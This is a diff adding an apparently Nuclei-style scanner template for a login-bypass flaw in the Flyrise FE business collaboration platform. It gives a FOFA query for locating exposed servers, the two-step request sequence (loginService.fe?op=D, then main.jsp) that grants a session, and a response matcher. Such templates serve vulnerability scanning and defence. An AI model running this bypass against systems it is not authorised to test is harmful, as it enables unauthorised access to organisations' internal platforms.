@@ -1,0 +1,25 @@
+id: flyrise-fe-loginservice-login-bypass
+
+info:
+  name: ⻜企互联loginService任意登录
+  author: qwtd
+  severity: high
+  description: |
+    FOFA: "flyrise.stopBackspace.js"
+    先访问/loginService.fe?op=D
+    再访问main.jsp
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94/%E2%BB%9C%E4%BC%81%E4%BA%92%E8%81%94loginService%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95.md
+  tags: 飞企互联-FE业务协作平台
+
+http:
+  - raw:
+      - |
+        GET /loginService.fe?op=D HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers:
+      - type: word
+        words:
+          - "流程未开始或被修改"
+
